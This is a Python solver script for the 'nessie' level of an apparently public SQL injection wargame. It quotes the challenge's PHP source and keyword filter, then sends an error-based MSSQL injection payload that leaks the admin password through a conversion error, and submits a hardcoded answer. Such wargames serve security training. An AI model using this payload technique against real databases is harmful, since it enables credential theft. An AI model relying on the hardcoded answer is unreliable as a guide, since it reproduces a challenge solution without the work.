#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    '''
    Nessie 41

    if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select id from prob_nessie where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    sqlsrv_query($db,$query);
    if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

    $query = "select pw from prob_nessie where id='admin'"; 
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("nessie"); 
    '''

    url = "https://los.rubiya.kr/chall/nessie_7c5b5d8119ce2951f2a4f2b3a1824dd2.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': 'admin'}

    payload = "' OR 1=(case when id='admin' then pw else 0 end)--"
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
    response = p.my_request()

    print('\n', response)

    p.payload = 'uawe0f9ji34fjkl'
    response = p.my_request()
    if 'Clear!' in response:
        print('\nNessie Clear!')


if __name__ == '__main__':
    main()
